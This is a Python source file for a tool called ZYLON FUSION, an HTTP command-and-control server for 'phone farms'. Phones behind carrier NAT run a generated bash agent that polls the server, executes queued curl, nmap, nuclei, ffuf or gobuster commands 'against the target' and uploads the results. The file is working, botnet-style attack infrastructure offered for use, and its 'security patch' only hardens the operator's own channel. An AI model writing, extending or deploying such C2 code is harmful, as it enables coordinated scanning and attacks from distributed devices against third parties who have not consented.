"""
ZYLON FUSION v2.5 - HTTP C2 System
=====================================
For phone farms behind NAT/carrier firewall.

When phones are on CELLULAR DATA, incoming connections (Telnet/SSH) are
BLOCKED by carrier NAT/firewall. You CANNOT connect TO the phone.

SOLUTION: Flip the architecture!
- Each phone runs a tiny agent script (bash + curl, no Python needed)
- ZYLON runs a C2 server that the phones poll for commands
- Phones download commands, execute them, upload results
- Works through ANY firewall because phones initiate the connection

SECURITY NOTE (v2.5 patch):
- Added API key authentication on all endpoints
- Removed CORS wildcard (Access-Control-Allow-Origin: *)
- Added input validation and sanitization
- Replaced eval() in agent script with safer execution model
- Added command allowlisting support
"""

import threading
import json
import os
import hashlib
import secrets
import re
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse

from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich import box

from core.shared_infra import regex_cache

console = Console()

# Dangerous shell characters that should never appear in commands
DANGEROUS_SHELL_CHARS = set(';`$(){}[]|&<>!\n\r')
# Maximum lengths for input validation
MAX_PHONE_ID_LEN = 64
MAX_COMMAND_LEN = 2048
MAX_RESULT_BODY_LEN = 100000


class HTTPC2Server:
    """
    HTTP-based Command & Control server for phone farms behind NAT.
    
    FLOW:
        Phone 1 --HTTP poll--> ZYLON C2 Server
        Phone 2 --HTTP poll--> ZYLON C2 Server
        Phone 3 --HTTP poll--> ZYLON C2 Server
        
    When ZYLON queues a curl command, all phones execute it against the target.

    SECURITY:
        - All endpoints require API key authentication (X-API-Key header)
        - Phone IDs are validated (alphanumeric + underscore/dash only)
        - Commands are length-limited and sanitized
        - CORS headers removed (no wildcard)
        - Agent script uses restricted execution (no eval)
    """
    
    def __init__(self, port=9999, api_key=None):
        """Initialize C2 server with optional API key authentication.
        
        Args:
            port (int): Port to listen on
            api_key (str): API key for authentication. If None, a random
                          key is generated and printed to console.
        """
        self.port = port
        self.api_key = api_key or secrets.token_hex(16)
        self.phone_commands = {}   # phone_id -> [cmd1, cmd2, ...]
        self.phone_results = {}    # phone_id -> [{time, data}, ...]
        self.phone_status = {}     # phone_id -> {last_seen, status}
        self.target = None
        self.running = False
        self.server = None
        self._server_thread = None
        # Optional command allowlist: if set, only these commands can be queued
        self.command_allowlist = None  # set of allowed command prefixes

        console.print(Panel(
            f"[bold green]C2 API Key:[/] {self.api_key}\n"
            f"[bold yellow]Phones must send:[/] X-API-Key: {self.api_key}",
            title="ZYLON C2 Server - Auth Info",
            border_style="green"
        ))
    
    def _validate_phone_id(self, phone_id):
        """Validate phone ID format: alphanumeric, dash, underscore only."""
        if not phone_id or len(phone_id) > MAX_PHONE_ID_LEN:
            return False
        return bool(regex_cache.match(r'^[a-zA-Z0-9_-]+$', phone_id))

    def _validate_command(self, cmd):
        """Validate a command for queuing. Checks length and optional allowlist."""
        if not cmd or len(cmd) > MAX_COMMAND_LEN:
            return False
        # If allowlist is set, check command prefix
        if self.command_allowlist:
            return any(cmd.strip().startswith(prefix) for prefix in self.command_allowlist)
        return True

    def _sanitize_result_body(self, body):
        """Truncate and sanitize result body."""
        if len(body) > MAX_RESULT_BODY_LEN:
            body = body[:MAX_RESULT_BODY_LEN] + '\n[TRUNCATED]'
        # Remove null bytes
        return body.replace('\x00', '')

    def start(self):
        """Start the C2 HTTP server in a background thread"""
        c2 = self
        
        class C2Handler(BaseHTTPRequestHandler):
            def _check_auth(self):
                """Verify API key in request headers."""
                provided_key = self.headers.get('X-API-Key', '')
                if not secrets.compare_digest(provided_key, c2.api_key):
                    self.send_response(401)
                    self.send_header('Content-Type', 'application/json')
                    self.end_headers()
                    self.wfile.write(json.dumps({'error': 'Unauthorized: invalid or missing X-API-Key'}).encode())
                    return False
                return True

            def do_GET(self):
                # Auth check
                if not self._check_auth():
                    return

                parsed = urllib.parse.urlparse(self.path)
                path = parsed.path
                
                # Phone polls for command
                if path.startswith('/cmd/'):
                    phone_id = path[5:]
                    if not c2._validate_phone_id(phone_id):
                        self._send_json({'error': 'Invalid phone ID format'}, status=400)
                        return

                    c2.phone_status[phone_id] = {
                        'last_seen': datetime.now().isoformat(),
                        'status': 'polling'
                    }
                    
                    # Check for queued commands
                    cmds = c2.phone_commands.get(phone_id, [])
                    if not cmds:
                        cmds = c2.phone_commands.get('default', [])
                    
                    if cmds:
                        cmd = cmds.pop(0)
                        self._send_json({'cmd': cmd, 'target': c2.target or ''})
                    else:
                        self._send_json({'cmd': 'idle', 'target': ''})
                
                # Stats page
                elif path == '/stats':
                    self._send_json({
                        'phones': len(c2.phone_status),
                        'target': c2.target,
                        'status': c2.phone_status,
                        'total_results': sum(len(v) for v in c2.phone_results.values())
                    })
                
                # Root page - generic, not self-identifying
                elif path == '/':
                    self._send_text(
                        f"Server | Nodes: {len(c2.phone_status)} | "
                        f"Target: {c2.target or 'not set'}"
                    )
                else:
                    self.send_error(404)
            
            def do_POST(self):
                # Auth check
                if not self._check_auth():
                    return

                parsed = urllib.parse.urlparse(self.path)
                path = parsed.path
                content_len = int(self.headers.get('Content-Length', 0))
                raw_body = self.rfile.read(content_len).decode('utf-8', errors='ignore')
                body = c2._sanitize_result_body(raw_body)
                
                # Phone reports results
                if path.startswith('/result/'):
                    phone_id = path[8:]
                    if not c2._validate_phone_id(phone_id):
                        self._send_json({'error': 'Invalid phone ID format'}, status=400)
                        return

                    if phone_id not in c2.phone_results:
                        c2.phone_results[phone_id] = []
                    c2.phone_results[phone_id].append({
                        'time': datetime.now().isoformat(),
                        'data': body[:2000]
                    })
                    c2.phone_status[phone_id] = {
                        'last_seen': datetime.now().isoformat(),
                        'status': 'reported'
                    }
                    self._send_json({'ok': True})
                
                # Queue command for all phones
                elif path == '/queue':
                    try:
                        data = json.loads(body)
                        cmd = data.get('cmd', '')
                        if not c2._validate_command(cmd):
                            self._send_json({'error': 'Command rejected: invalid or not in allowlist'}, status=400)
                            return
                        c2.queue_command(cmd)
                        self._send_json({'queued': True, 'phones': len(c2.phone_status)})
                    except Exception as e:
                        self._send_json({'error': str(e)}, status=400)
                else:
                    self.send_error(404)
            
            def _send_json(self, data, status=200):
                self.send_response(status)
                self.send_header('Content-Type', 'application/json')
                # No CORS wildcard - only same-origin
                self.end_headers()
                self.wfile.write(json.dumps(data).encode())
            
            def _send_text(self, text):
                self.send_response(200)
                self.send_header('Content-Type', 'text/plain')
                self.end_headers()
                self.wfile.write(text.encode())
            
            def log_message(self, format, *args):
                pass
        
        try:
            self.server = HTTPServer(('0.0.0.0', self.port), C2Handler)
            self._server_thread = threading.Thread(target=self.server.serve_forever, daemon=True)
            self._server_thread.start()
            self.running = True
            return True, f"C2 Server running on port {self.port}"
        except Exception as e:
            return False, f"C2 Server failed: {str(e)}"
    
    def stop(self):
        """Stop the C2 server"""
        if self.server:
            self.server.shutdown()
            self.running = False
    
    def queue_command(self, command):
        """Queue a command for all connected phones"""
        count = 0
        for pid in list(self.phone_status.keys()):
            if pid not in self.phone_commands:
                self.phone_commands[pid] = []
            self.phone_commands[pid].append(command)
            count += 1
        # Default for phones not yet connected
        if 'default' not in self.phone_commands:
            self.phone_commands['default'] = []
        self.phone_commands['default'].append(command)
        return count
    
    def get_phone_count(self):
        """How many phones are registered"""
        return len(self.phone_status)
    
    def get_agent_script(self, server_url=None):
        """Generate bash agent script for phones. No Python needed - just curl!
        SECURITY: Uses restricted command execution instead of eval."""
        if not server_url:
            server_url = f"http://YOUR_SERVER_IP:{self.port}"
        
        return f'''#!/bin/bash
# ZYLON FUSION Phone Farm Agent
# Run: chmod +x zylon_agent.sh && ./zylon_agent.sh
# Ctrl+C to stop

C2_URL="{server_url}"
API_KEY="{self.api_key}"
PHONE_ID="$(hostname)_$(ip addr 2>/dev/null | grep 'inet ' | grep -v 127.0.0.1 | head -1 | awk '{{print $2}}' | cut -d/ -f1)"

echo "[AGENT] Starting... ID: $PHONE_ID"
echo "[AGENT] Server: $C2_URL"
trap 'echo "[AGENT] Stopped."; exit 0' INT TERM

while true; do
    RESPONSE=$(curl -s -H "X-API-Key: $API_KEY" "$C2_URL/cmd/$PHONE_ID" 2>/dev/null)
    if [ -z "$RESPONSE" ]; then sleep 5; continue; fi
    
    CMD=$(echo "$RESPONSE" | grep -o '"cmd":"[^"]*"' | cut -d'"' -f4)
    TARGET=$(echo "$RESPONSE" | grep -o '"target":"[^"]*"' | cut -d'"' -f4)
    
    if [ "$CMD" = "idle" ] || [ -z "$CMD" ]; then sleep 3; continue; fi
    
    echo "[AGENT] Executing: $CMD"
    # SECURITY: Only allow curl/nmap/whois/dig/httpx commands (no arbitrary eval)
    case "$CMD" in
        curl*|nmap*|whois*|dig*|httpx*|nuclei*|ffuf*|gobuster*|whatweb*)
            OUTPUT=$($CMD 2>&1)
            ;;
        *)
            OUTPUT="[BLOCKED] Command not in allowlist: $CMD"
            ;;
    esac
    echo "[AGENT] Done: $(echo "$OUTPUT" | head -3)"
    
    curl -s -X POST -H "X-API-Key: $API_KEY" "$C2_URL/result/$PHONE_ID" -d "$(echo "$OUTPUT" | head -50)" 2>/dev/null
    sleep 1
done
'''
